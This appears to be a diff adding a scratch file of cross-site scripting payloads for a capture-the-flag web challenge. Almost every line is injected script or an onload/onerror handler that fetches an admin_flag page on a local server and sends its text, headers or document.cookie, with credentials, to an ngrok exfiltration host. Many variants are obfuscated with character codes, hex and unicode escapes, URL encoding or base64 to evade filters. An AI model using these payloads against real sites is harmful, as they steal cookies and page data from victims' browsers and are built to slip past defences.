@@ -1,0 +1,185 @@
+<script>fetch("http://127.0.0.1:1337").then(function(response){response.text().then(function (text) {return fetch("https://b7f9caa8.ngrok.io/?c=".concat(text),{credentials:'include'})})});fetch("http://127.0.0.1:1337").then(function(response){var headers="";for (let [key, value] of response.headers) {headers+="/"+key+value+"/"} fetch("https://b7f9caa8.ngrok.io/?c=".concat(headers),{credentials:'include'})})</script>
+<script>fetch("http://127.0.0.1:1337").then(function(response){response.text().then(function (text) {return fetch("https://b7f9caa8.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
+<script>fetch("http://127.0.0.1:1337").then(function(response){var headers="";for (let [key, value] of response.headers) {headers+="/"+key+value+"/"} fetch("https://b7f9caa8.ngrok.io/?c=".concat(headers),{credentials:'include'})})</script>
+$("div.admin_console").show();
+<script>fetch("http://127.0.0.1:1337/posts/itZBPvDrSbHg1XWN").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
+
+<script>fetch("http://127.0.0.1:1337/posts/itZBPvDrSbHg1XWN").then(response => response.text()).then(html => {return fetch("https://e96f25fb.ngrok.io/?c=".concat(document.getElementsByClassName("admin_console")[0]),{credentials:'include'})});</script>
+
+<script>fetch("http://127.0.0.1:1337/posts/itZBPvDrSbHg1XWN").then(response => response.text()).then(html => {var admincontent="";var contents=document.getElementsByClassName("admin_console");for (var i=0,len=contents.length|0;i<len;i=i+1|0){admincontent+="///"+contents[i].textContent} return fetch("https://e96f25fb.ngrok.io/?c=".concat(admincontent),{credentials:'include'})});</script>
+
+<script>fetch("http://127.0.0.1:1337/posts/itZBPvDrSbHg1XWN/Access+Flag").then(response => response.text()).then(html => {return fetch("https://e96f25fb.ngrok.io/?c=".concat(html),{credentials:'include'})});</script>
+
+<script>fetch("http://127.0.0.1:1337/posts/itZBPvDrSbHg1XWN").then(fetch("http://127.0.0.1:1337/Access%20Flag")).then(response => response.text()).then(html => {var admincontent="";var contents=document.getElementsByClassName("admin_console");for (var i=0,len=contents.length|0;i<len;i=i+1|0){admincontent+="///"+contents[i].textContent} return fetch("https://e96f25fb.ngrok.io/?c=".concat(admincontent),{credentials:'include'})});</script>
+
+<script>fetch("http://127.0.0.1:1337/posts/itZBPvDrSbHg1XWN/Access FlagDelete UserDelete Post").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
+
+
+
+
+
+Full hTML:
+<script>fetch("http://127.0.0.1:1337/posts/itZBPvDrSbHg1XWN").then(response => response.text()).then(html => {return fetch("https://e96f25fb.ngrok.io/?c=".concat(document.cookie),{method:'POST', credentials:'include', body: html})});</script>
+
+# Answer but need to evade
+<script>fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
+
+
+# Evasion
+<IMG """><SCRIPT>fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</SCRIPT>"\>
+
+<img src=`javascript:fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})})`>
+
+<img src=x onerror=fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})})>
+
+<BODY ONLOAD=(fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})}))>
+
+<BODY ONLOAD=fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});>
+:q
+
+# Check admin console
+<BODY ONLOAD=fetch("https://e96f25fb.ngrok.io/?c=".concat(document.cookie),{credentials:'include'})>
+
+
+String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103,34,41,46,116,104,101,110,40,102,117,110,99,116,105,111,110,40,114,101,115,112,111,110,115,101,41,123,114,101,115,112,111,110,115,101,46,116,101,120,116,40,41,46,116,104,101,110,40,102,117,110,99,116,105,111,110,32,40,116,101,120,116,41,32,123,114,101,116,117,114,110,32,102,101,116,99,104,40,34,104,116,116,112,115,58,47,47,101,101,98,53,48,100,54,99,46,110,103,114,111,107,46,105,111,47,63,99,61,34,46,99,111,110,99,97,116,40,116,101,120,116,41,44,123,99,114,101,100,101,110,116,105,97,108,115,58,39,105,110,99,108,117,100,101,39,125,41,125,41,125,41,59)
+
+<BODY ONLOAD=function(){return fetch("http://127.0.0.1:1337/admin_flag").then(function(response){return fetch("https://e96f25fb.ngrok.io/?c=".concat(response.text(),{credentials:'include'})})})}>
+<img src=x onerror="(function(){return fetch("http://127.0.0.1:1337/admin_flag").then(function(response){return fetch("https://e96f25fb.ngrok.io/?c=".concat(response.text(),{credentials:'include'})})})})(this)"/>
+
+<BODY ONLOAD=function(){fetch("http://127.0.0.1:1337/admin_flag").then(function(response){fetch("https://e96f25fb.ngrok.io/?c=".concat(document.cookie),{credentials:'include'})})}>
+<BODY ONLOAD='(function(){return fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text))})})})(this)'>
+
+<script>fetch("http://127.0.0.1:1337/admin_flag",{method: 'GET',headers: {'Referer', 'https://admin_secrets.tjctf.org/posts/77tOfu7nFG5MvySD'}}).then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
+<script>fetch("http://127.0.0.1:1337/admin_flag",{method: 'POST', headers: {'Referer', 'http://127.0.0.1:1337/posts/77tOfu7nFG5MvySD'}}).then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
+const myHeaders = new Headers();
+<script>const myHeaders = new Headers();myHeadersfetch.set('Referer', 'http://127.0.0.1:1337/posts/77tOfu7nFG5MvySD');("http://127.0.0.1:1337/admin_flag",{method: 'POST', headers: myHeaders}).then(function(response){response.text().then(function (text) {return fetch("http://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
+
+<BODY ONLOAD=const heads = new Headers();heads.set('Referer', 'http://127.0.0.1:1337/posts/77tOfu7nFG5MvySD');fetch("http://127.0.0.1:1337/admin_flag",{method: 'GET', headers: heads}).then(function(response){response.text().then(function (text) {const head1 = new Headers();head1.set('Referer', 'http://127.0.0.1:1337/posts/77tOfu7nFG5MvySD');return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include', headers: head1})})})>
+<script>const heads = new Headers();heads.set('Referer', 'http://127.0.0.1:1337/posts/77tOfu7nFG5MvySD');fetch("http://127.0.0.1:1337/admin_flag",{method: 'GET', headers: heads}).then(function(response){response.text().then(function (text) {const head1 = new Headers();head1.set('Referer', 'http://127.0.0.1:1337/posts/77tOfu7nFG5MvySD');return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include', headers: head1})})});</script>
+
+
+<BODY ONLOAD=fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})})>
+
+
+
+
+
+<BODY ONLOAD='(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)+text)})})})(this)'>
+
+# No Script
+<BODY ONLOAD='(function(){return fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text))})})})(this)'>
+
+
+# No quotes
+<BODY ONLOAD=`(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text))})})})(this)`>
+
+
+# No double quotes no script
+
+<BODY ONLOAD='(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)'>
+
+<BODY ONLOAD=%27(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)%27>
+
+
+
+<BODY ONLOAD=%27%28function%28%29%7Breturn%20fetch%28String.fromCharCode%28104%2C116%2C116%2C112%2C58%2C47%2C47%2C49%2C50%2C55%2C46%2C48%2C46%2C48%2C46%2C49%2C58%2C49%2C51%2C51%2C55%2C47%2C97%2C100%2C109%2C105%2C110%2C95%2C102%2C108%2C97%2C103%29%29.then%28function%28response%29%7Bresponse.text%28%29.then%28function%20%28text%29%20%7Breturn%20fetch%28String.fromCharCode%28104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C53%2C98%2C97%2C101%2C98%2C48%2C102%2C99%2C46%2C110%2C103%2C114%2C111%2C107%2C46%2C105%2C111%2C47%2C63%2C99%2C61%29%2Btext%29%7D%29%7D%29%7D%29%28this%29%27>
+
+<img src=x onerror=`javascript:%27%28function%28%29%7Breturn%20fetch%28String.fromCharCode%28104%2C116%2C116%2C112%2C58%2C47%2C47%2C49%2C50%2C55%2C46%2C48%2C46%2C48%2C46%2C49%2C58%2C49%2C51%2C51%2C55%2C47%2C97%2C100%2C109%2C105%2C110%2C95%2C102%2C108%2C97%2C103%29%29.then%28function%28response%29%7Bresponse.text%28%29.then%28function%20%28text%29%20%7Breturn%20fetch%28String.fromCharCode%28104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C53%2C98%2C97%2C101%2C98%2C48%2C102%2C99%2C46%2C110%2C103%2C114%2C111%2C107%2C46%2C105%2C111%2C47%2C63%2C99%2C61%29%2Btext%29%7D%29%7D%29%7D%29%28this%29%27`>
+<img src=x onerror=javascript:alert(1)>
+
+<img src=x onerror=javascript:alert(1)>
+
+<img src=x onerror='javascript:alert%281%29'>
+
+<img src=x onerror=javascript:%27%28function%28%29%7Breturn%20fetch%28String.fromCharCode%28104%2C116%2C116%2C112%2C58%2C47%2C47%2C49%2C50%2C55%2C46%2C48%2C46%2C48%2C46%2C49%2C58%2C49%2C51%2C51%2C55%2C47%2C97%2C100%2C109%2C105%2C110%2C95%2C102%2C108%2C97%2C103%29%29.then%28function%28response%29%7Bresponse.text%28%29.then%28function%20%28text%29%20%7Breturn%20fetch%28String.fromCharCode%28104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C53%2C98%2C97%2C101%2C98%2C48%2C102%2C99%2C46%2C110%2C103%2C114%2C111%2C107%2C46%2C105%2C111%2C47%2C63%2C99%2C61%29%2Btext%29%7D%29%7D%29%7D%29%28this%29%27>
+
+
+<BODY ONLOAD=setTimeout`function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)`>
+
+<BODY ONLOAD=eval;throw '=1;alert\u0028document.location\u0029'>
+
+
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+ZmV0Y2goImh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hZG1pbl9mbGFnIikudGhlbihmdW5jdGlvbihyZXNwb25zZSl7cmVzcG9uc2UudGV4dCgpLnRoZW4oZnVuY3Rpb24gKHRleHQpIHtyZXR1cm4gZmV0Y2goImh0dHBzOi8vNWJhZWIwZmMubmdyb2suaW8vP2M9Ii5jb25jYXQodGV4dCkse2NyZWRlbnRpYWxzOidpbmNsdWRlJ30pfSl9KTs8L3NjcmlwdD48L3N2Zz4=" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script></svg>
+
+eval;throw '=1;alert\u0028document.location\u0029'
+
+<BODY ONLOAD=eval;throw 'function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)'>
+
+
+<img src=x onerror=`javascript:fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})})`>
+
+
+
+# Single quote and Paranthesis remain
+
+<BODY ONLOAD='(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)'>
+
+<body onload=javascript:(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)>
+
+<BODY ONLOAD=eval;throw '=1;alert\u0028document.location\u0029'>
+
+
+<iframe src=javascript:`\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e` />
+
+
+<BODY ONLOAD='javascript:(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)'>
+
+
+# Only paranthesis remain
+<BODY ONLOAD=(function(){fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function(text){fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)>
+
+# Brackets bypassed but backticks are detected
+<BODY ONLOAD=setInterval`\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29`>
+
+
+<BODY ONLOAD=\\`\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29\\`>
+
+
+
+<BODY ONLOAD=`${\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29}`>
+
+
+
+data:text/html;base64,PHNjcmlwdD5mZXRjaCgiaHR0cDovLzEyNy4wLjAuMToxMzM3L2FkbWluX2ZsYWciKS50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKXtyZXNwb25zZS50ZXh0KCkudGhlbihmdW5jdGlvbiAodGV4dCkge3JldHVybiBmZXRjaCgiaHR0cHM6Ly9lOTZmMjVmYi5uZ3Jvay5pby8/Yz0iLmNvbmNhdCh0ZXh0KSl9KX0pOzwvc2NyaXB0Pgo=
+
+<BODY ONLOAD=setInterval&#96\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29&#96>
+
+
+### Random Retries
+"""
+<BODY ONLOAD=setTimeout`\u0028function\u0028\u0029{return fetch\u0028String.fromCharCode\u0028104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\u0029\u0029.then\u0028function\u0028response\u0029{response.text\u0028\u0029.then\u0028function \u0028text\u0029 {return fetch\u0028String.fromCharCode\u0028104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\u0029+text\u0029}\u0029}\u0029}\u0029\u0028this\u0029`>
+
+
+<BODY ONLOAD=setTimeout`\u0028function\u0028\u0029{return fetch\u0028\`http://127.0.0.1:1337/admin_flag\`\u0029.then\u0028function\u0028response\u0029{response.text\u0028\u0029.then\u0028function \u0028text\u0029 {return fetch\u0028\`https://5baeb0fc.ngrok.io/?c=\`.concat\u0028text\u0029\u0029}\u0029}\u0029}\u0029\u0028this\u0029`>
+
+
+setTimeout`\u0028function\u0028\u0029{return fetch\u0028\`http://127.0.0.1:1337/admin_flag\`\u0029.then\u0028function\u0028response\u0029{response.text\u0028\u0029.then\u0028function \u0028text\u0029 {return fetch\u0028\`https://5baeb0fc.ngrok.io/?c=\`+text\u0029}\u0029}\u0029}\u0029\u0028this\u0029`
+
+
+<BODY ONLOAD=`javascript:\u0028function\u0028\u0029{return fetch\u0028String.fromCharCode\u0028104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\u0029\u0029.then\u0028function\u0028response\u0029{response.text\u0028\u0029.then\u0028function \u0028text\u0029 {return fetch\u0028String.fromCharCode\u0028104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\u0029+text\u0029}\u0029}\u0029}\u0029\u0028this\u0029\u0029`>
+
+
+<BODY ONLOAD=setTimeout`%28function%28%29{return fetch%28String.fromCharCode%28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103%29%29.then%28function%28response%29{response.text%28%29.then%28function %28text%29 {return fetch%28String.fromCharCode%28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61%29+text%29}%29}%29}%29%28this%29`>
+
+
+
+<BODY ONLOAD='`function``{return fetch`String.fromCharCode`104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103``.then`function`response`{response.text``.then`function `text` {return fetch`String.fromCharCode`104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61`+text`}`}`}``this`'>
+
+<BODY ONLOAD='javascript:\x28function\x28\x29{return fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29 {return fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29'>
+
+
+
+<BODY ONLOAD='javascript:\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29'>
+
+
+
+<BODY ONLOAD=`\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29`>
+
+
+<BODY ONLOAD=setInterval&#96\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29&#96>
+
+<BODY ONLOAD=setInterval&#96\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29&#96>
+
+"""
